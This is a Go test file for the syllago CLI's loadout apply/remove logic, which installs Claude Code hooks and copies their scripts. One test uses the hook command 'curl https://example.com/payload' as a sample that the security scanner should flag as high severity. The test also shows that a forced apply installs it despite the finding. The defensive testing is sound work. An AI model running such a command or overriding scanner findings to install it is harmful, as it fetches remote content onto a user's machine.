package loadout

import (
	"errors"
	"io/fs"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"

	"github.com/OpenScribbler/syllago/cli/internal/catalog"
	"github.com/OpenScribbler/syllago/cli/internal/installer"
	"github.com/tidwall/gjson"
)

// writeHookCommand rewrites the hook in hookDir to run cmd, writing each
// script beside hook.json.
func writeHookCommand(t *testing.T, hookDir, cmd string, scripts map[string]string) {
	t.Helper()
	hookJSON := `{"spec":"hooks/0.1","hooks":[{"event":"PostToolUse","matcher":".*","handler":{"type":"command","command":` + jsonString(cmd) + `}}]}`
	if err := os.WriteFile(filepath.Join(hookDir, "hook.json"), []byte(hookJSON), 0644); err != nil {
		t.Fatal(err)
	}
	for name, body := range scripts {
		if err := os.WriteFile(filepath.Join(hookDir, name), []byte(body), 0755); err != nil {
			t.Fatal(err)
		}
	}
}

func jsonString(s string) string {
	return `"` + strings.ReplaceAll(strings.ReplaceAll(s, `\`, `\\`), `"`, `\"`) + `"`
}

func settingsCommand(t *testing.T, homeDir string) string {
	t.Helper()
	data, err := os.ReadFile(filepath.Join(homeDir, ".claude", "settings.json"))
	if err != nil {
		t.Fatalf("reading settings.json: %v", err)
	}
	return gjson.GetBytes(data, "hooks.PostToolUse.0.hooks.0.command").String()
}

func assertNoSnapshot(t *testing.T, projectRoot string) {
	t.Helper()
	if entries, _ := os.ReadDir(filepath.Join(projectRoot, ".syllago", "snapshots")); len(entries) != 0 {
		t.Errorf("snapshots left behind: %v", entries)
	}
}

// hookScriptsLeft lists what the applies left under the home directory's
// loadout-hooks directory.
func hookScriptsLeft(t *testing.T, homeDir string) []string {
	t.Helper()
	entries, err := os.ReadDir(filepath.Join(homeDir, ".syllago", "loadout-hooks"))
	if err != nil && !errors.Is(err, fs.ErrNotExist) {
		t.Fatal(err)
	}
	var names []string
	for _, e := range entries {
		names = append(names, e.Name())
	}
	return names
}

// The hook runs a copy of its item that the apply scanned, kept under the
// home directory, so neither a later change to the Library nor a write to
// the project can change what runs, and remove deletes the copy.
func TestApply_CopiesHookScriptsUnderTheHomeDir(t *testing.T) {
	homeDir, projectRoot, manifest, cat, prov := setupTestEnv(t)
	t.Setenv("HOME", homeDir)
	manifest.Rules = nil
	cat.Items = cat.Items[1:]
	writeHookCommand(t, cat.Items[0].Path, "./lint.sh --strict", map[string]string{"lint.sh": "#!/bin/sh\n. ./lib/common.sh\n"})
	os.Mkdir(filepath.Join(cat.Items[0].Path, "lib"), 0755)
	os.WriteFile(filepath.Join(cat.Items[0].Path, "lib", "common.sh"), []byte("echo common\n"), 0644)

	result, err := Apply(manifest, cat, prov, ApplyOptions{Mode: "keep", ProjectRoot: projectRoot, HomeDir: homeDir, RepoRoot: projectRoot})
	if err != nil {
		t.Fatalf("Apply: %v", err)
	}
	left := hookScriptsLeft(t, homeDir)
	if len(left) != 1 || !strings.HasPrefix(left[0], "my-hook-") {
		t.Fatalf("loadout-hooks holds %v, want one my-hook- directory", left)
	}
	scriptsDir := filepath.Join(homeDir, ".syllago", "loadout-hooks", left[0])
	copied := filepath.Join(scriptsDir, "lint.sh")
	if got, want := settingsCommand(t, homeDir), copied+" --strict"; got != want {
		t.Errorf("hook command = %q, want %q", got, want)
	}
	if info, err := os.Stat(copied); err != nil || info.Mode().Perm()&0100 == 0 {
		t.Errorf("copied script is not executable: %v, %v", info, err)
	}
	if data, err := os.ReadFile(filepath.Join(scriptsDir, "lib", "common.sh")); err != nil || string(data) != "echo common\n" {
		t.Errorf("the script's helper was not copied beside it: %q, %v", data, err)
	}
	if want := "Scripts will be copied to ~/.syllago/loadout-hooks/" + left[0] + "/"; !strings.Contains(strings.Join(result.Warnings, "\n"), want) {
		t.Errorf("warnings %q do not contain %q", result.Warnings, want)
	}

	if _, err := Remove(RemoveOptions{ProjectRoot: projectRoot}); err != nil {
		t.Fatalf("Remove: %v", err)
	}
	if left := hookScriptsLeft(t, homeDir); len(left) != 0 {
		t.Errorf("remove left the copied scripts: %v", left)
	}
}

// A try apply copies the scripts the same way, and the automatic revert at
// session end deletes them with the rest of the loadout.
func TestApply_TryModeRevertDeletesCopiedHookScripts(t *testing.T) {
	homeDir, projectRoot, manifest, cat, prov := setupTestEnv(t)
	t.Setenv("HOME", homeDir)
	manifest.Rules = nil
	cat.Items = cat.Items[1:]
	writeHookCommand(t, cat.Items[0].Path, "./lint.sh", map[string]string{"lint.sh": "#!/bin/sh\n"})

	if _, err := Apply(manifest, cat, prov, ApplyOptions{Mode: "try", ProjectRoot: projectRoot, HomeDir: homeDir, RepoRoot: projectRoot}); err != nil {
		t.Fatalf("Apply: %v", err)
	}
	if left := hookScriptsLeft(t, homeDir); len(left) != 1 {
		t.Fatalf("loadout-hooks holds %v after a try apply, want one directory", left)
	}

	if _, err := Remove(RemoveOptions{ProjectRoot: projectRoot, Auto: true}); err != nil {
		t.Fatalf("Remove --auto: %v", err)
	}
	if left := hookScriptsLeft(t, homeDir); len(left) != 0 {
		t.Errorf("the revert left the copied scripts: %v", left)
	}
	if _, err := os.Stat(filepath.Join(homeDir, ".claude", "settings.json")); !errors.Is(err, fs.ErrNotExist) {
		t.Errorf("the revert did not restore the absent settings.json (stat err %v)", err)
	}
}

// A scripts path the shell would split is quoted in the hook command.
func TestApply_QuotesAHookScriptPathWithASpace(t *testing.T) {
	t.Parallel()
	_, projectRoot, manifest, cat, prov := setupTestEnv(t)
	homeDir := filepath.Join(t.TempDir(), "my home")
	os.MkdirAll(homeDir, 0755)
	manifest.Rules = nil
	cat.Items = cat.Items[1:]
	writeHookCommand(t, cat.Items[0].Path, "./lint.sh", map[string]string{"lint.sh": "#!/bin/sh\n"})

	if _, err := Apply(manifest, cat, prov, ApplyOptions{Mode: "keep", ProjectRoot: projectRoot, HomeDir: homeDir, RepoRoot: projectRoot}); err != nil {
		t.Fatalf("Apply: %v", err)
	}
	left := hookScriptsLeft(t, homeDir)
	if len(left) != 1 {
		t.Fatalf("loadout-hooks holds %v", left)
	}
	want := "'" + filepath.Join(homeDir, ".syllago", "loadout-hooks", left[0], "lint.sh") + "'"
	if got := settingsCommand(t, homeDir); got != want {
		t.Errorf("hook command = %q, want %q", got, want)
	}
}

// A hook with high-severity findings shows them in the preview and fails
// the apply before anything changes, unless the apply is forced.
func TestApply_RefusesHookWithHighFindingsUnlessForced(t *testing.T) {
	t.Parallel()
	homeDir, projectRoot, manifest, cat, prov := setupTestEnv(t)
	manifest.Rules = nil
	cat.Items = cat.Items[1:]
	writeHookCommand(t, cat.Items[0].Path, "curl https://example.com/payload", nil)
	opts := ApplyOptions{Mode: "preview", ProjectRoot: projectRoot, HomeDir: homeDir, RepoRoot: projectRoot}

	preview, err := Apply(manifest, cat, prov, opts)
	if err != nil {
		t.Fatalf("preview: %v", err)
	}
	if len(preview.Actions) != 1 || preview.Actions[0].Action != "merge-hook" || !strings.Contains(preview.Actions[0].Problem, "high-severity") {
		t.Fatalf("preview actions = %+v, want a merge-hook naming its high-severity findings", preview.Actions)
	}

	opts.Mode = "keep"
	_, err = Apply(manifest, cat, prov, opts)
	var sfErr *ScannerFindingsError
	if !errors.As(err, &sfErr) || len(sfErr.Problems) != 1 || !strings.HasPrefix(sfErr.Problems[0], "my-hook — ") {
		t.Fatalf("keep: got %v, want a ScannerFindingsError naming my-hook", err)
	}
	if _, err := os.Lstat(filepath.Join(homeDir, ".claude", "settings.json")); !errors.Is(err, fs.ErrNotExist) {
		t.Errorf("refused apply wrote settings.json (lstat err %v)", err)
	}
	assertNoSnapshot(t, projectRoot)

	opts.Force = true
	result, err := Apply(manifest, cat, prov, opts)
	if err != nil {
		t.Fatalf("forced: %v", err)
	}
	if got := settingsCommand(t, homeDir); got != "curl https://example.com/payload" {
		t.Errorf("forced hook command = %q", got)
	}
	if !strings.Contains(strings.Join(result.Warnings, "\n"), "network request") {
		t.Errorf("forced apply warnings %q do not report the finding", result.Warnings)
	}
}

// A finding below high severity is reported and does not stop the apply.
func TestApply_WarnsOfAMediumFindingWithoutForce(t *testing.T) {
	t.Parallel()
	homeDir, projectRoot, manifest, cat, prov := setupTestEnv(t)
	manifest.Rules = nil
	cat.Items = cat.Items[1:]
	writeHookCommand(t, cat.Items[0].Path, "chmod 755 build.sh", nil)

	result, err := Apply(manifest, cat, prov, ApplyOptions{Mode: "keep", ProjectRoot: projectRoot, HomeDir: homeDir, RepoRoot: projectRoot})
	if err != nil {
		t.Fatalf("Apply: %v", err)
	}
	if !strings.Contains(strings.Join(result.Warnings, "\n"), "permission change") {
		t.Errorf("warnings %q do not report the finding", result.Warnings)
	}
}

// A script reference that leaves the hook's directory refuses the apply
// before it changes anything.
func TestApply_RefusesAHookScriptOutsideItsItem(t *testing.T) {
	t.Parallel()
	homeDir, projectRoot, manifest, cat, prov := setupTestEnv(t)
	manifest.Rules = nil
	cat.Items = cat.Items[1:]
	hookDir := cat.Items[0].Path
	os.WriteFile(filepath.Join(filepath.Dir(hookDir), "outside.sh"), []byte("#!/bin/sh\n"), 0755)
	writeHookCommand(t, hookDir, "../outside.sh", nil)

	_, err := Apply(manifest, cat, prov, ApplyOptions{Mode: "keep", ProjectRoot: projectRoot, HomeDir: homeDir, RepoRoot: projectRoot})
	if err == nil || !strings.Contains(err.Error(), "outside item directory") {
		t.Fatalf("Apply: got %v, want a containment refusal", err)
	}
	if _, err := os.Lstat(filepath.Join(homeDir, ".claude", "settings.json")); !errors.Is(err, fs.ErrNotExist) {
		t.Errorf("refused apply wrote settings.json (lstat err %v)", err)
	}
	assertNoSnapshot(t, projectRoot)
}

// A rollback deletes the scripts the apply copied, with the snapshot.
func TestApply_RollbackDeletesCopiedHookScripts(t *testing.T) {
	t.Parallel()
	if runtime.GOOS == "windows" || os.Geteuid() == 0 {
		t.Skip("needs a directory the test cannot write")
	}
	homeDir, projectRoot, manifest, cat, prov := setupTestEnv(t)
	manifest.Rules = nil
	cat.Items = cat.Items[1:]
	writeHookCommand(t, cat.Items[0].Path, "./lint.sh", map[string]string{"lint.sh": "#!/bin/sh\n"})
	syllagoDir := filepath.Join(projectRoot, ".syllago")
	os.MkdirAll(filepath.Join(syllagoDir, "snapshots"), 0755)
	// installed.json cannot be saved, which fails the apply after its writes.
	os.Chmod(syllagoDir, 0555)
	t.Cleanup(func() { os.Chmod(syllagoDir, 0755) })

	// Saving installed.json comes after every placement, so the hook and
	// its scripts were placed before the failure.
	_, err := Apply(manifest, cat, prov, ApplyOptions{Mode: "keep", ProjectRoot: projectRoot, HomeDir: homeDir, RepoRoot: projectRoot})
	if err == nil || !strings.Contains(err.Error(), "saving installed.json") || !strings.Contains(err.Error(), "rolled back") {
		t.Fatalf("Apply: got %v, want a rolled-back failure to save installed.json", err)
	}
	if left := hookScriptsLeft(t, homeDir); len(left) != 0 {
		t.Errorf("rollback left the copied scripts: %v", left)
	}
	assertNoSnapshot(t, projectRoot)
}

// A hook the legacy root records as installed is skipped in the preview,
// since the merge would refuse it, rather than failing the apply.
func TestApply_SkipsAHookInstalledUnderTheLegacyRoot(t *testing.T) {
	legacyRoot := catalog.GlobalContentDirOverride
	legacy := &installer.Installed{Hooks: []installer.InstalledHook{{Name: "my-hook", Event: "PostToolUse", Source: "export", Provider: "claude-code"}}}
	if err := installer.SaveInstalled(legacyRoot, legacy); err != nil {
		t.Fatalf("SaveInstalled: %v", err)
	}
	t.Cleanup(func() { installer.SaveInstalled(legacyRoot, &installer.Installed{}) })
	homeDir, projectRoot, manifest, cat, prov := setupTestEnv(t)
	manifest.Rules = nil
	cat.Items = cat.Items[1:]
	opts := ApplyOptions{Mode: "preview", ProjectRoot: projectRoot, HomeDir: homeDir, RepoRoot: projectRoot}

	preview, err := Apply(manifest, cat, prov, opts)
	if err != nil {
		t.Fatalf("preview: %v", err)
	}
	if len(preview.Actions) != 1 || preview.Actions[0].Action != "skip-exists" {
		t.Fatalf("preview actions = %+v, want one skip-exists", preview.Actions)
	}
	opts.Mode = "keep"
	if _, err := Apply(manifest, cat, prov, opts); err != nil {
		t.Fatalf("Apply: %v", err)
	}
}

// A legacy record with no provider predates provider tracking, so it means
// the hook is installed only where the provider's settings hold it.
func TestApply_PlacesAHookAProviderlessLegacyRecordDoesNotHold(t *testing.T) {
	legacyRoot := catalog.GlobalContentDirOverride
	legacy := &installer.Installed{Hooks: []installer.InstalledHook{{Name: "my-hook", Event: "PostToolUse", Source: "export", GroupHash: "elsewhere"}}}
	if err := installer.SaveInstalled(legacyRoot, legacy); err != nil {
		t.Fatalf("SaveInstalled: %v", err)
	}
	t.Cleanup(func() { installer.SaveInstalled(legacyRoot, &installer.Installed{}) })
	homeDir, projectRoot, manifest, cat, prov := setupTestEnv(t)
	manifest.Rules = nil
	cat.Items = cat.Items[1:]

	preview, err := Apply(manifest, cat, prov, ApplyOptions{Mode: "preview", ProjectRoot: projectRoot, HomeDir: homeDir, RepoRoot: projectRoot})
	if err != nil {
		t.Fatalf("preview: %v", err)
	}
	if len(preview.Actions) != 1 || preview.Actions[0].Action != "merge-hook" {
		t.Fatalf("preview actions = %+v, want one merge-hook", preview.Actions)
	}
}
